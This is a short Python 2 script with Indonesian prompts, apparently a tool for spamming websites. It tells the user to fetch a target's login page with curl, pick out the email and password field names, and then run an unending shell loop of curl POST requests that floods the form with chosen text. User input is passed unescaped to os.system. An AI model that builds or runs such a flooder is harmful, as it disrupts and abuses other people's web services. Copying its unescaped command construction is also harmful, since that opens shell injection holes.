import os
import sys
import random
import time
import json
import urllib,urllib2,socket,threading

R = "\033[1;31m";
G = "\033[5;32m";
B = "\033[1;34m";
Y = "\033[1;33m";
P = "\033[1;35m";
C = "\033[1;36m";
W = "\033[1;37m";
def cetak(x,e=0):
	w = 'mhkbpcP'
	for i in w:
		j = w.index(i)
		x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
	x += '\033[0m'
	x = x.replace('!0','\033[0m')
	if e != 0:
		sys.stdout.write(x)
	else:
		sys.stdout.write(x+'\n')
def k1(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.1)
def k2(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.8)
def inputD(x,v=0):
	while 1:
		try:
			a = raw_input('\x1b[32;1m%s\x1b[31;1m:\x1b[33;1m'%x)
		except:
			cetak('\n!m[!] Batal')
			keluar()
		if v:
			if a.upper() in v:
				break
			else:
				cetak('!m[!] Masukan Opsinya Bro...')
				continue
		else:
			if len(a) == 0:
				cetak('!m[!] Masukan dengan benar')
				continue
			else:
				break
	return a
def inputM(x,d):
	while 1:
		try:
			i = int(inputD(x))
		except:
			cetak('!m[!] Pilihan tidak ada')
			continue
		if i in d:
			break
		else:
			cetak('!m[!] Pilihan tidak ada')
	return i
def inputM(x,d):
	while 1:
		try:
			i = int(inputD(x))
		except:
			cetak('!m[!] Pilihan tidak ada')
			continue
		if i in d:
			break
		else:
			cetak('!m[!] Pilihan tidak ada')
	return i

def ga_ngerti():
    k1('''\033[1;32mscroll up dulu hasil dump php di atas ,scrool pelan dari atas 
kebawah
setalah itu cari tulisan <from method -blablabla- id="Email name="\033[1;31mname1\033[1;32m" nah ini yg pertama sebagai name1
setalah itu scroll pelan lagi cari name yang ke 2 id=Pass name="\033[1;31mname2\033[1;32m" nah ini yang di sebut name2
jangan lupa login di browsernya untuk hambil url terakhirnya''')
    k2(''' eh eh numpang curhat ya
kamu tau gak VoxAvor?? 
dia itu Cantik ,Baik,Gak munafik ,tapi kadang Bikin sebel, tapi tetep cantik ko
tapi .. sayang .,.
dia ... belum ada di indo Masih di negeri orang 
kalau dia di indo insyaallah gua langsung lamar hehe
Doain ya :V
Love you ALL
''')

def spam1():
        ('cari URL login Pagenya dulu')
        web =inputD('[?]web target')
        os.system("curl %s"%(web))
        k1('udah dapat kan name1 dan name2?')
        spam2()
def pilihan():
	cetak('!k Creator is NOOB : !cMr_MSDV')
        cetak('!mMau spam beneran ya?')
	k1('[1].Iya Mau')
	k1('[2].Nggak Jadi')
        i = inputM('Bener nih sayang mau spam?',[1,2])
	if i == 1:
	   os.system("pkg install curl && apt install curl")
	   os.system("clear")
	   spam1()
	elif i == 2:
	   k1(''''loh kenapa Nggak jadi?? ... \033[1;31m KAMU JAHAT
yaudah deh aku pulang aja -_-''')
	   sys.exit()
def spam2():
       k1('[1].iya udah')
       k1('[2].Ngga ngerti')
       b = inputM('[?]Pilih ya',[1,2])
       if b == 1:
             pilihan1()
       elif b == 2:
               ga_ngerti()
               spam2()
def pilihan1():
          n1 =inputD('name1(tambahin\033[1;31m "\033[1;32m di depanya)')
          n11 =inputD('masukin nick atau pesan lo')
          n2 =inputD('name2')
          n21 =inputD('masukin pesan lu atau nick lu(kasih\033[1;31m " \033[1;32mdi akhir pesan)')
	  web =inputD('url Akhir web')
          os.system("while true; do curl --data %s=%s&%s=%s %s; done;"%(n1,n11,n2,n21,web))
pilihan()
pilihan1()
#
#
#

